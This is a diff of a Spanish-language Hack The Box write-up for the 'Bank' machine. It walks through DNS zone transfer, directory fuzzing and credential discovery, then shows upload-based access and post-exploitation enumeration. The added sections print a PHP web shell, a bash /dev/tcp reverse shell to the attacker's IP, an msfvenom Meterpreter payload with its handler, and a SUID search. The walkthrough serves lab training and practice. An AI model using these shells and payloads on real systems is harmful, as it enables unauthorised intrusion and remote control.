@@ -23,10 +23,27 @@ tags:
   - Local Privilege Escalation - (LPE)
   - LPE - SUID Binary
   - OSCP Style
+  - Metasploit Framework
 ---
 ![](/assets/images/htb-writeup-bank/bank_logo.png)
 
 Esta máquina fue algo difícil porque no pude escalar privilegios usando un Exploit sino que se usa un binario que automáticamente te convierte en Root, además de que tuve que investigar bastante sobre operaciones REGEX (como las odio) para poder filtrar texto. Aunque se ven temas interesantes como el **ataque de transferencia de zona DNS** y veremos acerca del **virtual hosting** que por lo que he investigado, hay otras máquina que lo van a ocupar.
+
+Herramientas utilizadas:
+* *nmap*
+* *wappalizer*
+* *ping*
+* *dig*
+* *wfuzz*
+* *gobuster*
+* *curl*
+* *cat*
+* *grep*
+* *nc*
+* *PHP*
+* *msfvenom*
+* *msfconsole*
+* *python*
 
 
 <br>
@@ -42,12 +59,26 @@ Esta máquina fue algo difícil porque no pude escalar privilegios usando un Exp
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#HTTP">Analizando Puerto 80</a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+				<ul>
+					<li><a href="#Virtual">Probando Virtual Hosting de Máquina Víctima</a></li>
+					<li><a href="#dig">Recopilando Información de Registros DNS de la Máquina Víctima con Herramienta Dig</a></li>
+				</ul>
 				<li><a href="#Fuzz">Fuzzing</a></li>
 				<li><a href="#Subdom">Analizando Subdominios</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#Acceso">Ganando Acceso a la Máquina</a></li>
+				<li><a href="#cmd">Ganando Acceso con Archivo CMD de PHP</a></li>
+				<li><a href="#metas">Ganando Acceso con Metasploit Framework</a></li>
+			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
+			<ul>
+				<li><a href="#Enum">Enumeración de Máquina</a></li>
+				<li><a href="#PruebaExp">Probando Exploit: Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation</a></li>
+				<li><a href="#Binario">Escalando Privilegios Usando Binario de Máquina</a></li>
+			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
 </div>
@@ -68,7 +99,7 @@ Esta máquina fue algo difícil porque no pude escalar privilegios usando un Exp
 <h2 id="Ping">Traza ICMP</h2>
 
 Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veamos que SO opera ahí.
-```
+```bash
 ping -c 4 10.10.10.29                                                             
 PING 10.10.10.29 (10.10.10.29) 56(84) bytes of data.
 64 bytes from 10.10.10.29: icmp_seq=1 ttl=63 time=132 ms
@@ -84,7 +115,7 @@ Por el TTL, sabemos que es una máquina Linux, hagamos los escaneos de puertos y
 
 <h2 id="Puertos">Escaneo de Puertos</h2>
 
-```
+```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.29 -oG allPorts
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 12:01 CST
@@ -106,22 +137,24 @@ PORT   STATE SERVICE REASON
 
 Read data files from: /usr/bin/../share/nmap
 Nmap done: 1 IP address (1 host up) scanned in 24.00 seconds
-           Raw packets sent: 116367 (5.120MB) | Rcvd: 33677 (1.347MB)
 ```
-* -p-: Para indicarle un escaneo en ciertos puertos.
-* --open: Para indicar que aplique el escaneo en los puertos abiertos.
-* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
-* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
-* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
-* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
-* -Pn: Para indicar que se omita el descubrimiento de hosts.
-* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
 
-Hay tres puertos abiertos, hay 2 servicios que ya conocemos por los puertos, estos son el servicio SSH y el HTTP. Veamos que nos dice el escaneo de servicios.
+| Parámetros | Descripción |
+|--------------------------|
+| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
+| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
+| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
+| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
+| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
+| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
+| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
+| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
+
+Hay tres puertos abiertos, hay 2 servicios que ya conocemos por los puertos, estos son el **servicio SSH y el servicio HTTP**. Veamos que nos dice el escaneo de servicios.
 
 <h2 id="Servicios">Escaneo de Servicios</h2>
 
-```
+```bash
 nmap -sC -sV -p22,53,80 10.10.10.29 -oN targeted                                     
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 12:04 CST
 Nmap scan report for 10.10.10.29
@@ -145,16 +178,21 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 16.66 seconds
 ```
-* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
-* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
-* -p: Para indicar puertos específicos.
-* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-Vemos lo que opera en los puertos, para empezar como no tenemos credenciales no podemos entrar al servicio SSH así que lo único que podemos hacer es revisar la página web.
+| Parámetros | Descripción |
+|--------------------------|
+| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
+| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
+| *-p*       | Para indicar puertos específicos. |
+| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
+
+<br>
+
+Vemos lo que opera en los puertos, para empezar como no tenemos credenciales no podemos entrar al **servicio SSH**, así que lo único que podemos hacer es revisar la página web.
 
 ![](/assets/images/htb-writeup-bank/Captura1.png)
 
-Pues nos manda la página por defecto de Apache y no nos muestra nada en realidad. Incluso no es necesario ver el **Wappalizer** porque de plano no nos muestra nada que nos pueda ayudar.
+Pues nos manda la página por defecto de **Apache** y no nos muestra nada en realidad. Incluso no es necesario ver el **Wappalizer** porque no nos muestra nada que nos pueda ayudar.
 
 ¿Entonces que hacemos? Es momento de investigar.
 
@@ -171,40 +209,59 @@ Pues nos manda la página por defecto de Apache y no nos muestra nada en realida
 <br>
 
 
-<h2 id="HTTP">Analizando Puerto 80</h2>
+<h2 id="HTTP">Analizando Servicio HTTP</h2>
 
-Bueno para el caso de esta máquina hay que ser preciso en 2 puntos:
+Bueno para el caso de esta máquina hay que ser preciso en un tema importante:
 
-* No es lo mismo poner una IP de un dominio a poner el nombre del dominio, ejemplo, 10.10.10.29 o Ejemplo.com
+* *No es lo mismo poner una IP de un dominio a poner el nombre del dominio, ejemplo, 10.10.10.29 (IP) o Ejemplo.com (Dominio)*
 
 ¿Por qué? Porque quizá el servidor o máquina donde estén operando dichas páginas web tenga activo el **Virtual Hosting**.
 
-¿Y esta madre que es? Bueno:
+¿Y esta cosa que es? Bueno:
 
-**El alojamiento compartido o alojamiento virtual, en inglés Virtual hosting, es una de las modalidades más utilizadas por las empresas dedicadas al negocio del alojamiento web. Dependiendo de los recursos disponibles, permite tener una cantidad variable de dominios y sitios web en una misma máquina.​**
+| **Virtual Hosting** |
+|:-----------:|
+| *El alojamiento compartido o alojamiento virtual, en inglés Virtual hosting, es una de las modalidades más utilizadas por las empresas dedicadas al negocio del alojamiento web. Dependiendo de los recursos disponibles, permite tener una cantidad variable de dominios y sitios web en una misma máquina.* |
+
+<br>
 
 Es decir, que puede haber varios dominios en solo una máquina, como en este caso.
 
-¿Qué podemos hacer? Es sencillo, para nuestro caso **HackTheBox** suele tener dominios con el nombre de la máquina seguido de **.htb**. Podremos probar si esto es verdad mandando un ping al dominio **bank.htb**, que deducimos es el nombre de dominio que está ocupando la máquina:
+Esto también lo podemos saber, por el servicio que esta operando en el puerto 53, que es el **DNS ISC BIND**:
 
-```
+| **DNS ISC BIND** |
+|:-----------:|
+| *BIND es el servidor de DNS más comúnmente usado en Internet, ​​ especialmente en sistemas Unix, en los cuales es un estándar de facto.​ Es patrocinado por la Internet Systems Consortium (ISC).* |
+
+<br>
+
+<h3 id="Virtual">Probando Virtual Hosting de Máquina Víctima</h3>
+
+¿Qué podemos hacer? Es sencillo, para nuestro caso **Hack The Box** suele tener dominios con el nombre de la máquina seguido de **.htb**. 
+
+Podemos probar si esto es verdad mandando un ping al dominio **bank.htb**, que deducimos es el nombre de dominio que está ocupando la máquina:
+
+```bash
 ping -c 1 bank.htb   
 ping: bank.htb: Nombre o servicio desconocido
 ```
+
 Ok, pero no nos sale nada, ¿ahora qué? Tan simple como que tengamos que registrar ese dominio en el archivo **hosts** que esta guardado en el directorio **etc**, hagámoslo:
-```
+```bash
 locate /etc/hosts    
 /etc/hosts
 /etc/hosts.allow
 /etc/hosts.deny
 nano /etc/hosts
 ```
+
 Una vez dentro, vamos a poner la ip de la máquina más el dominio **bank.htb**:
-```
+```bash
 10.10.10.29 bank.htb
 ```
+
 Guardamos, salimos y volvemos a intentar mandar el ping:
-```
+```bash
 ping -c 1 bank.htb
 PING bank.htb (10.10.10.29) 56(84) bytes of data.
 64 bytes from bank.htb (10.10.10.29): icmp_seq=1 ttl=63 time=130 ms
@@ -225,7 +282,17 @@ Ahí está, tenemos un login, veamos que nos dice el **Wappalizer**:
 
 Tenemos bastante información que nos puede ser útil más adelante. Ahora vamos a utilizar una herramienta bastante útil para estos casos llamada **dig**.
 
-**Dig (Domain Information Groper) es una herramienta de línea de comandos de Linux que realiza búsquedas en los registros DNS, a través de los nombres de servidores, y te muestra el resultado.**
+<br>
+
+<h3 id="dig">Recopilando Información de Registros DNS de la Máquina Víctima con Herramienta Dig</h3>
+
+¿Qué hace la herramienta **dig**?
+
+| **Herramienta Dig** |
+|:-----------:|
+| *Dig (Domain Information Groper) es una herramienta de línea de comandos de Linux que realiza búsquedas en los registros DNS, a través de los nombres de servidores, y te muestra el resultado.* |
+
+<br>
 
 Aqui el link con más información:
 
@@ -233,8 +300,8 @@ Aqui el link con más información:
 
 Entonces, utilicemos esta herramienta, hagamos varias pruebas:
 
-* Vamos a especificar los nombres de servidores:
-```
+* Vamos a especificar el servidor **(@IP)** y un dominio **(bank.htb)**:
+```bash
 dig @10.10.10.29 bank.htb     
 ; <<>> DiG 9.18.12-1-Debian <<>> @10.10.10.29 bank.htb
 ; (1 server found)
@@ -258,8 +325,9 @@ ns.bank.htb.            604800  IN      A       10.10.10.29
 ;; WHEN: Mon Apr 03 13:12:37 CST 2023
 ;; MSG SIZE  rcvd: 86
 ```
+
 * Bien, ahora veamos que correos están registrados en la máquina:
-```
+```bash
 dig @10.10.10.29 bank.htb MX  
 ; <<>> DiG 9.18.12-1-Debian <<>> @10.10.10.29 bank.htb MX
 ; (1 server found)
@@ -284,7 +352,7 @@ Muy bien, tenemos un correo que en este caso puede ser un usuario para que podam
 <h2 id="Fuzz">Fuzzing</h2>
 
 Primero hagamos el **Fuzzing** y luego explico el ataque:
-```
+```bash
 wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://bank.htb/FUZZ/    
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
@@ -325,22 +393,66 @@ Processed Requests: 220560
 Filtered Requests: 220539
 Requests/sec.: 376.8565
 ```
-* -c: Para que se muestren los resultados con colores.
-* --hc: Para que no muestre el código de estado 404, hc = hide code.
-* -t: Para usar una cantidad específica de hilos.
-* -w: Para usar un diccionario de wordlist.
-* Diccionario que usamos: dirbuster
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-c*       | Para ver el resultado en un formato colorido. |
+| *--hc*     | Para no mostrar un código de estado en los resultados. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+
+<br>
+
+Excelente, ahora vamos a hacer lo mismo, pero con Gobuster:
+
+```bash
+gobuster dir -u http://bank.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://bank.htb/
+[+] Method:                  GET
+[+] Threads:                 20
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2024/04/18 14:29:50 Starting gobuster in directory enumeration mode
+===============================================================
+/uploads              (Status: 301) [Size: 305] [--> http://bank.htb/uploads/]
+/assets               (Status: 301) [Size: 304] [--> http://bank.htb/assets/]
+/inc                  (Status: 301) [Size: 301] [--> http://bank.htb/inc/]
+/server-status        (Status: 403) [Size: 288]
+/balance-transfer     (Status: 301) [Size: 314] [--> http://bank.htb/balance-transfer/]
+Progress: 220530 / 220561 (99.99%)
+===============================================================
+```
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-u*       | Para indicar la URL a utilizar. |
+| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
+| *-t*       | Para indicar la cantidad de hilos a usar. |
+
+<br>
+
 
 Bien, vemos algunos subdominios que podemos investigar, ahora el ataque.
 
 ¿Qué es un **Ataque de Transferencia de Zona DNS**?:
 
-**Una transferencia de zona es un mecanismo para replicar datos de DNS a través de servidores DNS. Es decir si se tienen dos servidores DNS, el primer servidor confía en AXFR para poner los mismos datos en un segundo servidor. AXFR es también utilizado por terceros no autorizados quienes requieran obtener datos más profundos de un sitio.**
+| **Ataque de Transferencia de Zona DNS (AXFR)** |
+|:-----------:|
+| *Una transferencia de zona es un mecanismo para replicar datos de DNS a través de servidores DNS. Es decir si se tienen dos servidores DNS, el primer servidor confía en AXFR para poner los mismos datos en un segundo servidor. AXFR es también utilizado por terceros no autorizados quienes requieran obtener datos más profundos de un sitio.* |
 
-Entonces lo que conseguiremos será más información sobre subdominios, algo similar al **Fuzzing** que hicimos, entonces probémoslo: 
-```
+<br>
+
+Entonces, lo que conseguiremos será más información sobre subdominios, algo similar al **Fuzzing** que hicimos, entonces probémoslo: 
+```bash
  dig @10.10.10.29 bank.htb AXFR
-
+.
 ; <<>> DiG 9.18.12-1-Debian <<>> @10.10.10.29 bank.htb AXFR
 ; (1 server found)
 ;; global options: +cmd
@@ -355,7 +467,7 @@ bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 6048
 ;; WHEN: Mon Apr 03 13:23:13 CST 2023
 ;; XFR size: 6 records (messages 1, bytes 171)
 ```
-Pues mucha información no nos dio, así que vamos a analizar los subdominios que obtuvimos del **Fuzzing**.
+Pues mucha información no nos dio, salvo el dominio **ns.bank.htb**, así que vamos a analizar los directorios que obtuvimos del **Fuzzing**.
 
 <h2 id="Subdom">Analizando Subdominios</h2>
 
@@ -369,20 +481,24 @@ Como vemos, hay algunos subdominios, pero el que más llama la atención es el *
 
 Changos, hay muchos archivos, pero ¿qué es esa extención **.acc**?, vamos a investigarla:
 
-**Los archivos en el formato ACC son utilizados por el software de Cuentas gráficas como archivos de datos de salida del proyecto que contienen datos introducidos por el autor de los archivos del CAC.**
+| **Archivos ACC** |
+|:-----------:|
+| *Los archivos en el formato ACC son utilizados por el software de Cuentas gráficas como archivos de datos de salida del proyecto que contienen datos introducidos por el autor de los archivos del CAC.* |
 
-Quiero entender que aquí se guardan datos que se han utilizado en la página web, como son muchos no quiero ponerme a ver cada uno a menos que lo requiera, entonces lo que haremos será descargar el texto de esta página para buscar si hay alguno diferente.
+<br>
+
+Quiero entender, que aquí se guardan datos que se han utilizado en la página web, como son muchos no quiero ponerme a ver cada uno a menos que lo requiera, entonces lo que haremos será descargar el texto de esta página para buscar si hay alguno diferente.
 
 ¿Y esto por qué? Porque hay muchos con el mismo peso, debe haber algunos con menor o mayor peso y eso quiere decir que son únicos.
 
 Para descargar el texto vamos a usar **curl** y expresiones **REGEX** para filtrar, vamos por pasos:
 
 * Descargamos el texto de esta página:
-```
+```bash
 curl -s -X GET "http://bank.htb/balance-transfer/"
 ```
 Si lo dejamos así, solo veremos el código HTML por lo que usaremos la herramienta **html2text** para cambiar de HTML a texto:
-```
+```bash
 curl -s -X GET "http://bank.htb/balance-transfer/" | html2text
 ```
 Ahora si se ve en texto, pero no quiero que se vean esos corchetes además de que nos molestaran a la hora del filtrado, así que vamos a eliminarlos con **awk**:
@@ -392,15 +508,18 @@ curl -s -X GET "http://bank.htb/balance-transfer/" | html2text | awk '{print $3 
 Ahora sí, con eso ya solamente quedaría el nombre del archivo y su peso.
 
 * Filtramos por **REGEX** para ver si hay archivos con menor o mayor peso:
-```
+```bash
 cat output | sed '/^\s*$/d' |
 ```
-Con **sed** vamos a eliminar los espacios que hay entre cada archivo de arriba a abajo para que solo queden los puros nombres y pesos. Y con grep vamos a ir eliminando los pesos más comunes que vimos a ojo de buen cubero, ósea el 585, 584, 583 y 582:
-```
+Con **sed** vamos a eliminar los espacios que hay entre cada archivo de arriba a abajo para que solo queden los puros nombres y pesos. 
+
+* Con **grep** vamos a ir eliminando los pesos más comunes que vimos a ojo de buen cubero, ósea el 585, 584, 583 y 582:
+```bash
 cat output | sed '/^\s*$/d' | grep -v -E "582|583|584|585"
 ```
+
 * Resultado final:
-```
+```bash
 cat output | sed '/^\s*$/d' | grep -v -E "582|583|584|585"
 of ******
 Last Description
@@ -417,7 +536,7 @@ Server bank.htb
 </p>
 
 Lo mandamos al directorio de trabajo y vemos su contenido:
-```
+```bash
 cat 68576f20e9732f1b2edc4df5b8533230.acc 
 --ERR ENCRYPT FAILED
 +=================+
@@ -433,7 +552,7 @@ Transactions: 39
 Balance: 8842803 .
 ===UserAccount===
 ```
-Mira nada más, son el usuario y contraseña, bueno ya teníamos el usuario, ahora vamos a probarlos:
+Mira nada más, son el usuario y contraseña, bueno ya teníamos un usuario, ahora vamos a probarlos:
 
 ![](/assets/images/htb-writeup-bank/Captura7.png)
 
@@ -463,10 +582,12 @@ Aqui un Payload:
 <br>
 
 
+<h2 id="Acceso">Ganando Acceso a la Máquina</h2>
+
 En el link anterior hay un Payload hecho en **PHP** que debemos modificar metiendo nuestra IP y un puerto al que debemos conectarnos, hagámoslo por pasos:
 
 * Descargando Payload:
-```
+```bash
 git clone https://github.com/pentestmonkey/php-reverse-shell.git                         
 Clonando en 'php-reverse-shell'...
 remote: Enumerating objects: 10, done.
@@ -476,17 +597,20 @@ remote: Total 10 (delta 1), reused 1 (delta 1), pack-reused 7
 Recibiendo objetos: 100% (10/10), 9.81 KiB | 837.00 KiB/s, listo.
 Resolviendo deltas: 100% (2/2), listo.
 ```
+
 * Ahora modificamos el Payload, puedes eliminar lo demás, no es necesario:
-```
+```bash
 $VERSION = "1.0";
 $ip = 'Tu_IP';  // CHANGE THIS
 $port = Puerto_Que_Quieras;       // CHANGE THIS
 $chunk_size = 1400;
 ```
+
 * Bien, vamos a renombrarlo para agregarle la extensión **.htb**:
+```bash
+mv php-reverse-shell.php LocalRS.htb
 ```
-mv php-reverse-shell.php LocalPE.htb
-```
+
 * Una vez ya modificado, lo subimos:
 
 <p align="center">
@@ -494,10 +618,11 @@ mv php-reverse-shell.php LocalPE.htb
 </p>
 
 * Levantamos una netcat con el puerto que pusimos en el Payload:
-```
+```bash
 nc -nvlp 443                          
 listening on [any] 443 ...
 ```
+
 * Ya cargado en la página el Payload, le damos click en donde lo pide:
 
 <p align="center">
@@ -505,7 +630,7 @@ listening on [any] 443 ...
 </p>
 
 * ¡Y estamos dentro!:
-```
+```bash
 nc -nvlp 443                          
 listening on [any] 443 ...
 connect to [10.10.14.14] from (UNKNOWN) [10.10.10.29] 56838
@@ -518,6 +643,111 @@ $ whoami
 www-data
 ```
 Ya solo es cosa de buscar la flag del usuario que esta en el directorio **/home**.
+
+<h2 id="cmd">Ganando Acceso con Archivo CMD de PHP</h2>
+
+Como ya vimos que si acepto nuestro archivo malicioso, vamos a probar a cargar un archivo que contenga una CMD en PHP, para que podamos ejecutar comandos desde la Web y poder ganar acceso desde ahí.
+
+Hagamoslo por pasos:
+
+* Crea el siguiente script en **PHP**:
+```bash
+<?php
+	system($_REQUEST['cmd']);
+?>
+```
+
+* Carga el script y ve entra en ese archivo:
+
+<p align="center">
+<img src="/assets/images/htb-writeup-bank/Captura12.png">
+</p>
+
+* Desde la URL ya podras ejecutar cualquier comando.
+
+<p align="center">
+<img src="/assets/images/htb-writeup-bank/Captura13.png">
+</p>
+
+* Levanta una **netcat**:
+```bash
+nc -nvlp 1234
+listening on [any] 1234 ...
+```
+
+* Ejecuta el siguiente comando en la URL, **cambiamos los ampersant (&) por %26** para que funcione correctamente:
+```bash
+Original:
+?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.77/1234 0&>1'
+.
+.
+Modificado para web:
+?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.77/1234 0>%261'
+```
+
+* Observa la netcat:
+```bash
+nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.77] from (UNKNOWN) [10.10.10.29] 44272
+bash: cannot set terminal process group (1069): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@bank:/var/www/bank/uploads$ whoami
+whoami
+www-data
+```
+
+Y listo, ya hemos ganado acceso de esta otra forma. Puedes hacer un tratamiento de la TTY, pero creo que es un poco inestable la shell, así que ten cuidado.
+
+<h2 id="metas">Ganando Acceso con Metasploit Framework</h2>
+
+Para realizar esto, necesitamos una **Reverse Shell** que nos de una sesión de **Meterpreter**, para hacer esto necesitamos la **herramienta msfvenom** para crear el Payload que sea ejecutable en **PHP**.
+
+Hagamoslo por pasos:
+
+* Ejecuta el siguiente comando para crear nuestra **Reverse Shell** con **Msfvenom**:
+```bash
+msfvenom -p php/meterpreter_reverse_tcp LHOST=Tu_IP LPORT=1212 -f raw > shell.htb
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 34850 bytes
+```
+
+* Cargalo a la página.
+
+<p align="center">
+<img src="/assets/images/htb-writeup-bank/Captura14.png">
+</p>
+
+* Abre el **Metasploit** y usa el **modulo multi/handler**, vamos a configurarlo para que nuestra Reverse Shell se pueda conectar con la misma configuración:
+```bash
+msfconsole
+.
+.
+.
+msf6 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) >
+msf6 exploit(multi/handler) > set LHOST TU_IP
+LHOST => Tu_IP
+msf6 exploit(multi/handler) > set LPORT 1212
+LPORT => 1212
+msf6 exploit(multi/handler) > set payload linux/x86/meterpreter_reverse_tcp
+payload => linux/x86/meterpreter_reverse_tcp
+msf6 exploit(multi/handler) > exploit
+.
+[*] Started reverse TCP handler on Tu_IP:1212 
+[*] Meterpreter session 1 opened (Tu_IP:1212 -> 10.10.10.29:57824)
+.
+meterpreter > sysinfo
+Computer    : bank
+OS          : Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686
+Meterpreter : php/linux
+meterpreter > getuid
+Server username: www-data
+```
+Y listo, con esto hemos ganado acceso a la máquina con **Metasploit Framework**.
 
 
 <br>
@@ -532,8 +762,10 @@ Ya solo es cosa de buscar la flag del usuario que esta en el directorio **/home*
 <br>
 
 
+<h2 id="Enum">Enumeración de Máquina</h2>
+
 ¿Qué podemos hacer? Lo más fácil seria ver que permisos tenemos, pero antes vamos a sacar un terminal más interactiva:
-```
+```bash
 $ python -c 'import pty; pty.spawn("/bin/bash")'
 www-data@bank:/$ ls
 ls
@@ -541,14 +773,16 @@ bin   etc         initrd.img.old  media  proc  sbin  tmp  vmlinuz
 boot  home        lib             mnt    root  srv   usr  vmlinuz.old
 dev   initrd.img  lost+found      opt    run   sys   var
 ```
+
 Ahora si, vamos a ver los permisos:
-```
+```bash
 www-data@bank:/$ id
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+
 Mmmmm no creo que sean muy útiles los permisos, veamos que versión de Linux tiene, aunque el escaneo de servicios ya nos lo dio:
-```
+```bash
 www-data@bank:/$ uname -r
 uname -r
 4.4.0-79-generic
@@ -556,12 +790,13 @@ www-data@bank:/$ uname -a
 uname -a
 Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 athlon i686 GNU/Linux
 ```
+
 Muy bien, busquemos un Exploit. Buscando un Exploit por internet, encontré este:
 
 * https://www.exploit-db.com/exploits/44298
 
 Bien, busquemoslo con **Searchsploit**:
-```
+```bash
 searchsploit Ubuntu 16.04.4  
 ----------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                             |  Path
@@ -571,8 +806,9 @@ Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation          
 Shellcodes: No Results
 Papers: No Results
 ```
+
 Analizándolo un poco pues no creo que nos sirva mucho, más que nada no tiene especificaciones sobre cómo usarlo, entonces busquemos otro:
-```
+```bash
 searchsploit Linux 4.4.0-79        
 ----------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                             |  Path
@@ -608,12 +844,46 @@ Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial of Service    
 Linux kernel < 4.10.15 - Race Condition Privilege Escalation                                               | linux/local/43345.c
 ...
 ```
+
 Son un buen, pero el que me llamo la atención fue este: **Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation**
 
-Vamos a descargarlo y a analizarlo:
-```
-searchsploit -m linux/local/47169.c
+Pero antes, si tienes la sesión activa del **Meterpreter** en **Metasploit**, entonces puedes usar el **modulo Suggester**, para que nos diga si encuentra algún exploit que pueda vulnerar la máquina.
 
+Vamos por pasos:
+
+* Busca el **modulo Suggester** y cargalo:
+
+```bash
+msf6 exploit(multi/handler) > search suggester
+.
+Matching Modules
+================
+.
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
+.
+.
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester
+```
+* Configura el modulo y activalo:
+```bash
+msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
+SESSION => 1
+msf6 post(multi/recon/local_exploit_suggester) > exploit
+.
+[*] 10.10.10.29 - Collecting local exploits for php/linux...
+[-] 10.10.10.29 - No suggestions available.
+[*] Post module execution completed
+```
+Vaya, pues no funciono. Bueno, nunca esta de más probar cualquier cosilla que se te ocurra que pueda ayudar, sigamos con el Exploit planeado.
+
+<h2 id="PruebaExp">Probando Exploit: Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation</h2>
+
+Vamos a descargarlo y a analizarlo:
+```bash
+searchsploit -m linux/local/47169.c
+.
   Exploit: Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)
       URL: https://www.exploit-db.com/exploits/47169
      Path: /usr/share/exploitdb/exploits/linux/local/47169.c
@@ -622,7 +892,7 @@ searchsploit -m linux/local/47169.c
 File Type: C source, ASCII text
 ```
 Excelente, nos da especificaciones sobre cómo usarlo:
-```
+```bash
 // Usage:
 // user@ubuntu:~$ uname -a
 // Linux ubuntu 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
@@ -635,12 +905,13 @@ Excelente, nos da especificaciones sobre cómo usarlo:
 ```
 Ahora intentemos subirlo, vamos por pasos:
 * Primero vamos a abrir un servidor con Python:
-```
+```bash
 python3 -m http.server                                                            
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
+
 * Ahora intentemos subirlo:
-```
+```bash
 www-data@bank:/$ curl -O http://10.10.14.14:8000/LocalPE.c
 curl -O http://10.10.14.14:8000/LocalPE.c
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -649,8 +920,9 @@ curl -O http://10.10.14.14:8000/LocalPE.c
   9 28360    9  2656    0     0   9388      0  0:00:03 --:--:--  0:00:03  9418
 curl: (23) Failed writing body (0 != 2656)
 ```
+
 * Chetos no se puede, intentémoslo de otra forma:
-```
+```bash
 www-data@bank:/$ wget 10.10.14.14/LocalPE.c
 wget 10.10.14.14/LocalPE.c
 --2023-04-04 02:11:28--  http://10.10.14.14/LocalPE.c
@@ -658,8 +930,10 @@ Connecting to 10.10.14.14:80... failed: Connection refused.
 ```
 Era OBVIO que no teníamos permisos para descargar cosas xd, solamente lo hice para tener un ejemplo de cómo enviar archivos a un SO Linux.
 
+<h2 id="Binario">Escalando Privilegios Usando Binario de Máquina</h2>
+
 ¿Entonces que queda? Investiguemos que archivos tenemos permisos para usar:
-```
+```bash
 www-data@bank:/$ find \-perm -4000 2>/dev/null
 find \-perm -4000 2>/dev/null
 ./var/htb/bin/emergency
@@ -686,20 +960,20 @@ find \-perm -4000 2>/dev/null
 ./bin/mount
 ./bin/umount
 ```
-Tenemos varios como el passwd, sudo y uno que es extraño:
